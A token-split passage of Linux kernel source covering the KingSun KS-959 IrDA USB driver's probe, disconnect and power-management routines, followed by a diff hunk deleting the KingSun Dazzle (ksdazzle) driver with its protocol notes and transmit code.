"ndo_do_ioctl", "=", "ks959_net_ioctl", ",", "}", ";", "/", "*", "*", "This", "routine", "is", "called", "by", "the", "USB", "subsystem", "for", "each", "new", "device", "*", "in", "the", "system", ".", "We", "need", "to", "check", "if", "the", "device", "is", "ours", ",", "and", "in", "*", "this", "case", "start", "handling", "it", ".", "*", "/", "static", "int", "ks959_probe", "(", "struct", "usb_interface", "*", "intf", ",", "const", "struct", "usb_device_id", "*", "id", ")", "{", "struct", "usb_device", "*", "dev", "=", "interface_to_usbdev", "(", "intf", ")", ";", "struct", "ks959_cb", "*", "kingsun", "=", "NULL", ";", "struct", "net_device", "*", "net", "=", "NULL", ";", "int", "ret", "=", "-", "ENOMEM", ";", "/", "*", "Allocate", "network", "device", "container", ".", "*", "/", "net", "=", "alloc_irdadev", "(", "sizeof", "(", "*", "kingsun", ")", ");", "if", "(", "!", "net", ")", "goto", "err_out1", ";", "SET_NETDEV_DEV", "(", "net", ",", "&", "intf", "-", ">", "dev", ")", ";", "kingsun", "=", "netdev_priv", "(", "net", ")", ";", "kingsun", "-", ">", "netdev", "=", "net", ";", "kingsun", "-", ">", "usbdev", "=", "dev", ";", "kingsun", "-", ">", "irlap", "=", "NULL", ";", "kingsun", "-", ">", "tx_setuprequest", "=", "NULL", ";", "kingsun", "-", ">", "tx_urb", "=", "NULL", ";", "kingsun", "-", ">", "tx_buf_clear", "=", "NULL", ";", "kingsun", "-", ">", "tx_buf_xored", "=", "NULL", ";", "kingsun", "-", ">", "tx_buf_clear_used", "=", "0", ";", "kingsun", "-", ">", "tx_buf_clear_sent", "=", "0", ";", "kingsun", "-", ">", "rx_setuprequest", "=", "NULL", ";", "kingsun", "-", ">", "rx_urb", "=", "NULL", ";", "kingsun", "-", ">", "rx_buf", "=", "NULL", ";", "kingsun", "-", ">", "rx_variable_xormask", "=", "0", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "in_frame", "=", "FALSE", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "state", "=", "OUTSIDE_FRAME", ";", "kingsun", "-", ">", "rx_unwrap_buff", ".", "skb", "=", "NULL", ";", "kingsun", "-", ">", "receiving", "=", "0", ";", "spin_lock_init", "(", "&", "kingsun", "-", ">", "lock", ")", ";", "kingsun", "-", ">", "speed_setuprequest", "=", "NULL", ";", "kingsun", "-", ">", "speed_urb", "=", "NULL", ";", "kingsun", "-", ">", "speedparams", ".", "baudrate", "=", "0", ";", "/", "*", "Allocate", "input", "buffer", "*", "/", "kingsun", "-", ">", "rx_buf", "=", "kmalloc", "(", "KINGSUN_RCV_FIFO_SIZE", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "rx_buf", ")", "goto", "free_mem", ";", "/", "*", "Allocate", "input", "setup", "packet", "*", "/", "kingsun", "-", ">", "rx_setuprequest", "=", "kmalloc", "(", "sizeof", "(", "struct", "usb_ctrlrequest", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "rx_setuprequest", ")", "goto", "free_mem", ";", "kingsun", "-", ">", "rx_setuprequest", "-", ">", "bRequestType", "=", "USB_DIR_IN", "|", "USB_TYPE_CLASS", "|", "USB_RECIP_INTERFACE", ";", "kingsun", "-", ">", "rx_setuprequest", "-", ">", "bRequest", "=", "KINGSUN_REQ_RECV", ";", "kingsun", "-", ">", "rx_setuprequest", "-", ">", "wValue", "=", "cpu_to_le16", "(", "0x0200", ")", ";", "kingsun", "-", ">", "rx_setuprequest", "-", ">", "wIndex", "=", "0", ";", "kingsun", "-", ">", "rx_setuprequest", "-", ">", "wLength", "=", "cpu_to_le16", "(", "KINGSUN_RCV_FIFO_SIZE", ")", ";", "/", "*", "Allocate", "output", "buffer", "*", "/", "kingsun", "-", ">", "tx_buf_clear", "=", "kmalloc", "(", "KINGSUN_SND_FIFO_SIZE", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "tx_buf_clear", ")", "goto", "free_mem", ";", "kingsun", "-", ">", "tx_buf_xored", "=", "kmalloc", "(", "KINGSUN_SND_PACKET_SIZE", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "tx_buf_xored", ")", "goto", "free_mem", ";", "/", "*", "Allocate", "and", "initialize", "output", "setup", "packet", "*", "/", "kingsun", "-", ">", "tx_setuprequest", "=", "kmalloc", "(", "sizeof", "(", "struct", "usb_ctrlrequest", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "tx_setuprequest", ")", "goto", "free_mem", ";", "kingsun", "-", ">", "tx_setuprequest", "-", ">", "bRequestType", "=", "USB_DIR_OUT", "|", "USB_TYPE_CLASS", "|", "USB_RECIP_INTERFACE", ";", "kingsun", "-", ">", "tx_setuprequest", "-", ">", "bRequest", "=", "KINGSUN_REQ_SEND", ";", "kingsun", "-", ">", "tx_setuprequest", "-", ">", "wValue", "=", "0", ";", "kingsun", "-", ">", "tx_setuprequest", "-", ">", "wIndex", "=", "0", ";", "kingsun", "-", ">", "tx_setuprequest", "-", ">", "wLength", "=", "0", ";", "/", "*", "Allocate", "and", "initialize", "speed", "setup", "packet", "*", "/", "kingsun", "-", ">", "speed_setuprequest", "=", "kmalloc", "(", "sizeof", "(", "struct", "usb_ctrlrequest", ")", ",", "GFP_KERNEL", ")", ";", "if", "(", "!", "kingsun", "-", ">", "speed_setuprequest", ")", "goto", "free_mem", ";", "kingsun", "-", ">", "speed_setuprequest", "-", ">", "bRequestType", "=", "USB_DIR_OUT", "|", "USB_TYPE_CLASS", "|", "USB_RECIP_INTERFACE", ";", "kingsun", "-", ">", "speed_setuprequest", "-", ">", "bRequest", "=", "KINGSUN_REQ_SEND", ";", "kingsun", "-", ">", "speed_setuprequest", "-", ">", "wValue", "=", "cpu_to_le16", "(", "0x0200", ")", ";", "kingsun", "-", ">", "speed_setuprequest", "-", ">", "wIndex", "=", "cpu_to_le16", "(", "0x0001", ")", ";", "kingsun", "-", ">", "speed_setuprequest", "-", ">", "wLength", "=", "cpu_to_le16", "(", "sizeof", "(", "struct", "ks959_speedparams", ")", ");", "printk", "(", "KERN_INFO", "\"", "KingSun", "KS", "-", "959", "IRDA", "/", "USB", "found", "at", "address", "%", "d", ",", "\"", "\"", "Vendor", ":", "%", "x", ",", "Product", ":", "%", "x", "\\", "n", "\"", ",", "dev", "-", ">", "devnum", ",", "le16_to_cpu", "(", "dev", "-", ">", "descriptor", ".", "idVendor", ")", ",", "le16_to_cpu", "(", "dev", "-", ">", "descriptor", ".", "idProduct", ")", ");", "/", "*", "Initialize", "QoS", "for", "this", "device", "*", "/", "irda_init_max_qos_capabilies", "(", "&", "kingsun", "-", ">", "qos", ")", ";", "/", "*", "Baud", "rates", "known", "to", "be", "supported", ".", "Please", "uncomment", "if", "devices", "(", "other", "than", "a", "SonyEriccson", "K300", "phone", ")", "can", "be", "shown", "to", "support", "higher", "speed", "with", "this", "dongle", ".", "*", "/", "kingsun", "-", ">", "qos", ".", "baud_rate", ".", "bits", "=", "IR_2400", "|", "IR_9600", "|", "IR_19200", "|", "IR_38400", "|", "IR_57600", ";", "kingsun", "-", ">", "qos", ".", "min_turn_time", ".", "bits", "&", "=", "KINGSUN_MTT", ";", "irda_qos_bits_to_value", "(", "&", "kingsun", "-", ">", "qos", ")", ";", "/", "*", "Override", "the", "network", "functions", "we", "need", "to", "use", "*", "/", "net", "-", ">", "netdev_ops", "=", "&", "ks959_ops", ";", "ret", "=", "register_netdev", "(", "net", ")", ";", "if", "(", "ret", "!", "=", "0", ")", "goto", "free_mem", ";", "dev_info", "(", "&", "net", "-", ">", "dev", ",", "\"", "IrDA", ":", "Registered", "KingSun", "KS", "-", "959", "device", "%", "s", "\\", "n", "\"", ",", "net", "-", ">", "name", ")", ";", "usb_set_intfdata", "(", "intf", ",", "kingsun", ")", ";", "/", "*", "Situation", "at", "this", "point", ":", "-", "all", "work", "buffers", "allocated", "-", "setup", "requests", "pre", "-", "filled", "-", "urbs", "not", "allocated", ",", "set", "to", "NULL", "-", "max", "rx", "packet", "known", "(", "is", "KINGSUN_FIFO_SIZE", ")", "-", "unwrap", "state", "machine", "(", "partially", ")", "initialized", ",", "but", "skb", "=", "=", "NULL", "*", "/", "return", "0", ";", "free_mem", ":", "kfree", "(", "kingsun", "-", ">", "speed_setuprequest", ")", ";", "kfree", "(", "kingsun", "-", ">", "tx_setuprequest", ")", ";", "kfree", "(", "kingsun", "-", ">", "tx_buf_xored", ")", ";", "kfree", "(", "kingsun", "-", ">", "tx_buf_clear", ")", ";", "kfree", "(", "kingsun", "-", ">", "rx_setuprequest", ")", ";", "kfree", "(", "kingsun", "-", ">", "rx_buf", ")", ";", "free_netdev", "(", "net", ")", ";", "err_out1", ":", "return", "ret", ";", "}", "/", "*", "*", "The", "current", "device", "is", "removed", ",", "the", "USB", "layer", "tell", "us", "to", "shut", "it", "down", ".", "..", "*", "/", "static", "void", "ks959_disconnect", "(", "struct", "usb_interface", "*", "intf", ")", "{", "struct", "ks959_cb", "*", "kingsun", "=", "usb_get_intfdata", "(", "intf", ")", ";", "if", "(", "!", "kingsun", ")", "return", ";", "unregister_netdev", "(", "kingsun", "-", ">", "netdev", ")", ";", "/", "*", "Mop", "up", "receive", "&", "&", "transmit", "urb", "'", "s", "*", "/", "if", "(", "kingsun", "-", ">", "speed_urb", "!", "=", "NULL", ")", "{", "usb_kill_urb", "(", "kingsun", "-", ">", "speed_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "speed_urb", ")", ";", "kingsun", "-", ">", "speed_urb", "=", "NULL", ";", "}", "if", "(", "kingsun", "-", ">", "tx_urb", "!", "=", "NULL", ")", "{", "usb_kill_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "kingsun", "-", ">", "tx_urb", "=", "NULL", ";", "}", "if", "(", "kingsun", "-", ">", "rx_urb", "!", "=", "NULL", ")", "{", "usb_kill_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "usb_free_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "kingsun", "-", ">", "rx_urb", "=", "NULL", ";", "}", "kfree", "(", "kingsun", "-", ">", "speed_setuprequest", ")", ";", "kfree", "(", "kingsun", "-", ">", "tx_setuprequest", ")", ";", "kfree", "(", "kingsun", "-", ">", "tx_buf_xored", ")", ";", "kfree", "(", "kingsun", "-", ">", "tx_buf_clear", ")", ";", "kfree", "(", "kingsun", "-", ">", "rx_setuprequest", ")", ";", "kfree", "(", "kingsun", "-", ">", "rx_buf", ")", ";", "free_netdev", "(", "kingsun", "-", ">", "netdev", ")", ";", "usb_set_intfdata", "(", "intf", ",", "NULL", ")", ";", "}", "#", "ifdef", "CONFIG_PM", "/", "*", "USB", "suspend", ",", "so", "power", "off", "the", "transmitter", "/", "receiver", "*", "/", "static", "int", "ks959_suspend", "(", "struct", "usb_interface", "*", "intf", ",", "pm_message_t", "message", ")", "{", "struct", "ks959_cb", "*", "kingsun", "=", "usb_get_intfdata", "(", "intf", ")", ";", "netif_device_detach", "(", "kingsun", "-", ">", "netdev", ")", ";", "if", "(", "kingsun", "-", ">", "speed_urb", "!", "=", "NULL", ")", "usb_kill_urb", "(", "kingsun", "-", ">", "speed_urb", ")", ";", "if", "(", "kingsun", "-", ">", "tx_urb", "!", "=", "NULL", ")", "usb_kill_urb", "(", "kingsun", "-", ">", "tx_urb", ")", ";", "if", "(", "kingsun", "-", ">", "rx_urb", "!", "=", "NULL", ")", "usb_kill_urb", "(", "kingsun", "-", ">", "rx_urb", ")", ";", "return", "0", ";", "}", "/", "*", "Coming", "out", "of", "suspend", ",", "so", "reset", "hardware", "*", "/", "static", "int", "ks959_resume", "(", "struct", "usb_interface", "*", "intf", ")", "{", "struct", "ks959_cb", "*", "kingsun", "=", "usb_get_intfdata", "(", "intf", ")", ";", "if", "(", "kingsun", "-", ">", "rx_urb", "!", "=", "NULL", ")", "{", "/", "*", "Setup", "request", "already", "filled", "in", "ks959_probe", "*", "/", "usb_submit_urb", "(", "kingsun", "-", ">", "rx_urb", ",", "GFP_KERNEL", ")", ";", "}", "netif_device_attach", "(", "kingsun", "-", ">", "netdev", ")", ";", "return", "0", ";", "}", "#", "endif", "/", "*", "*", "USB", "device", "callbacks", "*", "/", "static", "struct", "usb_driver", "irda_driver", "=", "{", ".", "name", "=", "\"", "ks959", "-", "sir", "\"", ",", ".", "probe", "=", "ks959_probe", ",", ".", "disconnect", "=", "ks959_disconnect", ",", ".", "id_table", "=", "dongles", ",", "#", "ifdef", "CONFIG_PM", ".", "suspend", "=", "ks959_suspend", ",", ".", "resume", "=", "ks959_resume", ",", "#", "endif", "}", ";", "module_usb_driver", "(", "irda_driver", ")", ";", "MODULE_AUTHOR", "(", "\"", "Alex", "Villac", "\u00ed", "s", "Lasso", "<", "a_villacis", "@", "palosanto", ".", "com", ">", "\")", ";", "MODULE_DESCRIPTION", "(", "\"", "IrDA", "-", "USB", "Dongle", "Driver", "for", "KingSun", "KS", "-", "959", "\"", ");", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "@", "@", "-", "1", ",", "813", "+", "0", ",", "0", "@", "@", "/", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "*", "*", "*", "Filename", ":", "ksdazzle", ".", "c", "*", "Version", ":", "0", ".", "1", ".", "2", "*", "Description", ":", "Irda", "KingSun", "Dazzle", "USB", "Dongle", "*", "Status", ":", "Experimental", "*", "Author", ":", "Alex", "Villac", "\u00ed", "s", "Lasso", "<", "a_villacis", "@", "palosanto", ".", "com", ">", "*", "*", "Based", "on", "stir4200", ",", "mcs7780", ",", "kingsun", "-", "sir", "drivers", ".", "*", "*", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "*", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "*", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ".", "*", "*", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "*", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "*", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "*", "GNU", "General", "Public", "License", "for", "more", "details", ".", "*", "*", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "*", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "*", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "*", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "**", "/", "/", "*", "*", "Following", "is", "my", "most", "current", "(", "2007", "-", "07", "-", "26", ")", "understanding", "of", "how", "the", "Kingsun", "*", "07D0", ":", "4100", "dongle", "(", "sometimes", "known", "as", "the", "MA", "-", "660", ")", "is", "supposed", "to", "work", ".", "This", "*", "information", "was", "deduced", "by", "examining", "the", "USB", "traffic", "captured", "with", "USBSnoopy", "*", "from", "the", "WinXP", "driver", ".", "Feel", "free", "to", "update", "here", "as", "more", "of", "the", "dongle", "is", "*", "known", ".", "*", "*", "General", ":", "This", "dongle", "exposes", "one", "interface", "with", "two", "interrupt", "endpoints", ",", "one", "*", "IN", "and", "one", "OUT", ".", "In", "this", "regard", ",", "it", "is", "similar", "to", "what", "the", "Kingsun", "/", "Donshine", "*", "dongle", "(", "07c0", ":", "4200", ")", "exposes", ".", "Traffic", "is", "raw", "and", "needs", "to", "be", "wrapped", "and", "*", "unwrapped", "manually", "as", "in", "stir4200", ",", "kingsun", "-", "sir", ",", "and", "ks959", "-", "sir", ".", "*", "*", "Transmission", ":", "To", "transmit", "an", "IrDA", "frame", ",", "it", "is", "necessary", "to", "wrap", "it", ",", "then", "*", "split", "it", "into", "multiple", "segments", "of", "up", "to", "7", "bytes", "each", ",", "and", "transmit", "each", "in", "*", "sequence", ".", "It", "seems", "that", "sending", "a", "single", "big", "block", "(", "like", "kingsun", "-", "sir", "does", ")", "*", "won", "'", "t", "work", "with", "this", "dongle", ".", "Each", "segment", "needs", "to", "be", "prefixed", "with", "a", "value", "*", "equal", "to", "(", "unsigned", "char", ")", "0xF8", "+", "<", "number", "of", "bytes", "in", "segment", ">", ",", "inside", "a", "payload", "*", "of", "exactly", "8", "bytes", ".", "For", "example", ",", "a", "segment", "of", "1", "byte", "gets", "prefixed", "by", "0xF9", ",", "*", "and", "one", "of", "7", "bytes", "gets", "prefixed", "by", "0xFF", ".", "The", "bytes", "at", "the", "end", "of", "the", "*", "payload", ",", "not", "considered", "by", "the", "prefix", ",", "are", "ignored", "(", "set", "to", "0", "by", "this", "*", "implementation", ")", ".", "*", "*", "Reception", ":", "To", "receive", "data", ",", "the", "driver", "must", "poll", "the", "dongle", "regularly", "(", "like", "*", "kingsun", "-", "sir", ".", "c", ")", "with", "interrupt", "URBs", ".", "If", "data", "is", "available", ",", "it", "will", "be", "returned", "*", "in", "payloads", "from", "0", "to", "8", "bytes", "long", ".", "When", "concatenated", ",", "these", "payloads", "form", "*", "a", "raw", "IrDA", "stream", "that", "needs", "to", "be", "unwrapped", "as", "in", "stir4200", "and", "kingsun", "-", "sir", "*", "*", "Speed", "change", ":", "To", "change", "the", "speed", "of", "the", "dongle", ",", "the", "driver", "prepares", "a", "*", "control", "URB", "with", "the", "following", "as", "a", "setup", "packet", ":", "*", "bRequestType", "USB_DIR_OUT", "|", "USB_TYPE_CLASS", "|", "USB_RECIP_INTERFACE", "*", "bRequest", "0x09", "*", "wValue", "0x0200", "*", "wIndex", "0x0001", "*", "wLength", "0x0008", "(", "length", "of", "the", "payload", ")", "*", "The", "payload", "is", "a", "8", "-", "byte", "record", ",", "apparently", "identical", "to", "the", "one", "used", "in", "*", "drivers", "/", "usb", "/", "serial", "/", "cypress_m8", ".", "c", "to", "change", "speed", ":", "*", "__u32", "baudSpeed", ";", "*", "unsigned", "int", "dataBits", ":", "2", ";", "/", "/", "0", "-", "5", "bits", "3", "-", "8", "bits", "*", "unsigned", "int", ":", "1", ";", "*", "unsigned", "int", "stopBits", ":", "1", ";", "*", "unsigned", "int", "parityEnable", ":", "1", ";", "*", "unsigned", "int", "parityType", ":", "1", ";", "*", "unsigned", "int", ":", "1", ";", "*", "unsigned", "int", "reset", ":", "1", ";", "*", "unsigned", "char", "reserved", "[", "3", "]", ";", "/", "/", "set", "to", "0", "*", "*", "For", "now", "only", "SIR", "speeds", "have", "been", "observed", "with", "this", "dongle", ".", "Therefore", ",", "*", "nothing", "is", "known", "on", "what", "changes", "(", "if", "any", ")", "must", "be", "done", "to", "frame", "wrapping", "/", "*", "unwrapping", "for", "higher", "than", "SIR", "speeds", ".", "This", "driver", "assumes", "no", "change", "is", "*", "necessary", "and", "announces", "support", "for", "all", "the", "way", "to", "115200", "bps", ".", "*", "/", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "moduleparam", ".", "h", ">", "#", "include", "<", "linux", "/", "kernel", ".", "h", ">", "#", "include", "<", "linux", "/", "types", ".", "h", ">", "#", "include", "<", "linux", "/", "errno", ".", "h", ">", "#", "include", "<", "linux", "/", "slab", ".", "h", ">", "#", "include", "<", "linux", "/", "usb", ".", "h", ">", "#", "include", "<", "linux", "/", "device", ".", "h", ">", "#", "include", "<", "linux", "/", "crc32", ".", "h", ">", "#", "include", "<", "asm", "/", "unaligned", ".", "h", ">", "#", "include", "<", "asm", "/", "byteorder", ".", "h", ">", "#", "include", "<", "linux", "/", "uaccess", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "irda", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "wrapper", ".", "h", ">", "#", "include", "<", "net", "/", "irda", "/", "crc", ".", "h", ">", "#", "define", "KSDAZZLE_VENDOR_ID", "0x07d0", "#", "define", "KSDAZZLE_PRODUCT_ID", "0x4100", "/", "*", "These", "are", "the", "currently", "known", "USB", "ids", "*", "/", "static", "const", "struct", "usb_device_id", "dongles", "[", "]", "=", "{", "/", "*", "KingSun", "Co", ",", "Ltd", "IrDA", "/", "USB", "Bridge", "*", "/", "{", "USB_DEVICE", "(", "KSDAZZLE_VENDOR_ID", ",", "KSDAZZLE_PRODUCT_ID", ")", "},", "{", "}", "}", ";", "MODULE_DEVICE_TABLE", "(", "usb", ",", "dongles", ")", ";", "#", "define", "KINGSUN_MTT", "0x07", "#", "define", "KINGSUN_REQ_RECV", "0x01", "#", "define", "KINGSUN_REQ_SEND", "0x09", "#", "define", "KINGSUN_SND_FIFO_SIZE", "2048", "/", "*", "Max", "packet", "we", "can", "send", "*", "/", "#", "define", "KINGSUN_RCV_MAX", "2048", "/", "*", "Max", "transfer", "we", "can", "receive", "*", "/", "struct", "ksdazzle_speedparams", "{", "__le32", "baudrate", ";", "/", "*", "baud", "rate", ",", "little", "endian", "*", "/", "__u8", "flags", ";", "__u8", "reserved", "[", "3", "]", ";", "}", "__packed", ";", "#", "define", "KS_DATA_5_BITS", "0x00", "#", "define", "KS_DATA_6_BITS", "0x01", "#", "define", "KS_DATA_7_BITS", "0x02", "#", "define", "KS_DATA_8_BITS", "0x03", "#", "define", "KS_STOP_BITS_1", "0x00", "#", "define", "KS_STOP_BITS_2", "0x08", "#", "define", "KS_PAR_DISABLE", "0x00", "#", "define", "KS_PAR_EVEN", "0x10", "#", "define", "KS_PAR_ODD", "0x30", "#", "define", "KS_RESET", "0x80", "#", "define", "KINGSUN_EP_IN", "0", "#", "define", "KINGSUN_EP_OUT", "1", "struct", "ksdazzle_cb", "{", "struct", "usb_device", "*", "usbdev", ";", "/", "*", "init", ":", "probe_irda", "*", "/", "struct", "net_device", "*", "netdev", ";", "/", "*", "network", "layer", "*", "/", "struct", "irlap_cb", "*", "irlap", ";", "/", "*", "The", "link", "layer", "we", "are", "binded", "to", "*", "/", "struct", "qos_info", "qos", ";", "struct", "urb", "*", "tx_urb", ";", "__u8", "*", "tx_buf_clear", ";", "unsigned", "int", "tx_buf_clear_used", ";", "unsigned", "int", "tx_buf_clear_sent", ";", "__u8", "tx_payload", "[", "8", "]", ";", "struct", "urb", "*", "rx_urb", ";", "__u8", "*", "rx_buf", ";", "iobuff_t", "rx_unwrap_buff", ";", "struct", "usb_ctrlrequest", "*", "speed_setuprequest", ";", "struct", "urb", "*", "speed_urb", ";", "struct", "ksdazzle_speedparams", "speedparams", ";", "unsigned", "int", "new_speed", ";", "__u8", "ep_in", ";", "__u8", "ep_out", ";", "spinlock_t", "lock", ";", "int", "receiving", ";", "}", ";", "/", "*", "Callback", "transmission", "routine", "*", "/", "static", "void", "ksdazzle_speed_irq", "(", "struct", "urb", "*", "urb", ")", "{", "/", "*", "unlink", ",", "shutdown", ",", "unplug", ",", "other", "nasties", "*", "/", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "dev_err", "(", "&", "urb", "-", ">", "dev", "-", ">", "dev", ",", "\"", "ksdazzle_speed_irq", ":", "urb", "asynchronously", "failed", "-", "%", "d", "\\", "n", "\"", ",", "urb", "-", ">", "status", ")", ";", "}", "/", "*", "Send", "a", "control", "request", "to", "change", "speed", "of", "the", "dongle", "*", "/", "static", "int", "ksdazzle_change_speed", "(", "struct", "ksdazzle_cb", "*", "kingsun", ",", "unsigned", "speed", ")", "{", "static", "unsigned", "int", "supported_speeds", "[", "]", "=", "{", "2400", ",", "9600", ",", "19200", ",", "38400", ",", "57600", ",", "115200", ",", "576000", ",", "1152000", ",", "4000000", ",", "0", "}", ";", "int", "err", ";", "unsigned", "int", "i", ";", "if", "(", "kingsun", "-", ">", "speed_setuprequest", "=", "=", "NULL", "|", "|", "kingsun", "-", ">", "speed_urb", "=", "=", "NULL", ")", "return", "-", "ENOMEM", ";", "/", "*", "Check", "that", "requested", "speed", "is", "among", "the", "supported", "ones", "*", "/", "for", "(", "i", "=", "0", ";", "supported_speeds", "[", "i", "]", "&", "&", "supported_speeds", "[", "i", "]", "!", "=", "speed", ";", "i", "+", "+)", ";", "if", "(", "supported_speeds", "[", "i", "]", "=", "=", "0", ")", "return", "-", "EOPNOTSUPP", ";", "memset", "(", "&(", "kingsun", "-", ">", "speedparams", ")", ",", "0", ",", "sizeof", "(", "struct", "ksdazzle_speedparams", ")", ");", "kingsun", "-", ">", "speedparams", ".", "baudrate", "=", "cpu_to_le32", "(", "speed", ")", ";", "kingsun", "-", ">", "speedparams", ".", "flags", "=", "KS_DATA_8_BITS", ";", "/", "*", "speed_setuprequest", "pre", "-", "filled", "in", "ksdazzle_probe", "*", "/", "usb_fill_control_urb", "(", "kingsun", "-", ">", "speed_urb", ",", "kingsun", "-", ">", "usbdev", ",", "usb_sndctrlpipe", "(", "kingsun", "-", ">", "usbdev", ",", "0", ")", ",", "(", "unsigned", "char", "*", ")", "kingsun", "-", ">", "speed_setuprequest", ",", "&", "(", "kingsun", "-", ">", "speedparams", ")", ",", "sizeof", "(", "struct", "ksdazzle_speedparams", ")", ",", "ksdazzle_speed_irq", ",", "kingsun", ")", ";", "kingsun", "-", ">", "speed_urb", "-", ">", "status", "=", "0", ";", "err", "=", "usb_submit_urb", "(", "kingsun", "-", ">", "speed_urb", ",", "GFP_ATOMIC", ")", ";", "return", "err", ";", "}", "/", "*", "Submit", "one", "fragment", "of", "an", "IrDA", "frame", "to", "the", "dongle", "*", "/", "static", "void", "ksdazzle_send_irq", "(", "struct", "urb", "*", "urb", ")", ";", "static", "int", "ksdazzle_submit_tx_fragment", "(", "struct", "ksdazzle_cb", "*", "kingsun", ")", "{", "unsigned", "int", "wraplen", ";", "int", "ret", ";", "/", "*", "We", "can", "send", "at", "most", "7", "bytes", "of", "payload", "at", "a", "time", "*", "/", "wraplen", "=", "7", ";", "if", "(", "wraplen", ">", "kingsun", "-", ">", "tx_buf_clear_used", ")", "wraplen", "=", "kingsun", "-", ">", "tx_buf_clear_used", ";", "/", "*", "Prepare", "payload", "prefix", "with", "used", "length", "*", "/", "memset", "(", "kingsun", "-", ">", "tx_payload", ",", "0", ",", "8", ")", ";", "kingsun", "-", ">", "tx_payload", "[", "0", "]", "=", "(", "unsigned", "char", ")", "0xf8", "+", "wraplen", ";", "memcpy", "(", "kingsun", "-", ">", "tx_payload", "+", "1", ",", "kingsun", "-", ">", "tx_buf_clear", ",", "wraplen", ")", ";", "usb_fill_int_urb", "(", "kingsun", "-", ">", "tx_urb", ",", "kingsun", "-", ">", "usbdev", ",", "usb_sndintpipe", "(", "kingsun", "-", ">", "usbdev", ",", "kingsun", "-", ">", "ep_out", ")", ",", "kingsun", "-", ">", "tx_payload", ",", "8", ",", "ksdazzle_send_irq", ",", "kingsun", ",", "1", ")", ";", "kingsun", "-", ">", "tx_urb", "-", ">", "status", "=", "0", ";", "ret", "=", "usb_submit_urb", "(", "kingsun", "-", ">", "tx_urb", ",", "GFP_ATOMIC", ")", ";", "/", "*", "Remember", "how", "much", "data", "was", "sent", ",", "in", "order", "to", "update", "at", "callback", "*", "/", "kingsun", "-", ">", "tx_buf_clear_sent", "=", "(", "ret", "=", "=", "0", ")", "?", "wraplen", ":", "0", ";", "return", "ret", ";", "}", "/", "*", "Callback", "transmission", "routine", "*", "/", "static", "void", "ksdazzle_send_irq", "(", "struct", "urb", "*", "urb", ")", "{", "struct", "ksdazzle_cb", "*", "kingsun", "=", "urb", "-", ">", "context", ";", "struct", "net_device", "*", "netdev", "=", "kingsun", "-", ">", "netdev", ";", "int", "ret", "=", "0", ";", "/", "*", "in", "process", "of", "stopping", ",", "just", "drop", "data", "*", "/", "if", "(", "!", "netif_running", "(", "kingsun", "-", ">", "netdev", ")", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "ksdazzle_send_irq", ":", "Network", "not", "running", "!", "\\", "n", "\"", ");", "return", ";", "}", "/", "*", "unlink", ",", "shutdown", ",", "unplug", ",", "other", "nasties", "*", "/", "if", "(", "urb", "-", ">", "status", "!", "=", "0", ")", "{", "dev_err", "(", "&", "kingsun", "-", ">", "usbdev", "-", ">", "dev", ",", "\"", "ksdazzle_send_irq", ":", "urb", "asynchronously", "failed", "-", "%", "d", "\\", "n", "\"", ",", "urb", "-", ">", "status", ")", ";", "return", ";", "}", "if", "(", "kingsun", "-", ">", "tx_buf_clear_used", ">", "0", ")", "{", "/", "*", "Update", "data", "remaining", "to", "be", "sent", "*", "/", "if", "(", "kingsun", "-", ">", "tx_buf_clear_sent", "<", "kingsun", "-", ">", "tx_buf_clear_used", ")", "{", "memmove", "(", "kingsun", "-", ">", "tx_buf_clear", ",", "kingsun", "-", ">", "tx_buf_clear", "+", "kingsun", "-", ">", "tx_buf_clear_sent", ",", "kingsun", "-", ">", "tx_buf_clear_used", "kingsun", "-", ">", "tx_buf_clear_sent", ")", ";", "}", "kingsun", "-", ">", "tx_buf_clear_used", "-", "=", "kingsun", "-", ">", "tx_buf_clear_sent", ";", "kingsun", "-", ">", "tx_buf_clear_sent", "=", "0", ";", "if", "(", "kingsun", "-", ">", "tx_buf_clear_used", ">", "0", ")", "{", "/", "*", "There", "is", "more", "data", "to", "be", "sent", "*", "/", "if", "(", "(", "ret", "=", "ksdazzle_submit_tx_fragment", "(", "kingsun", ")", ")", "!", "=", "0", ")", "{", 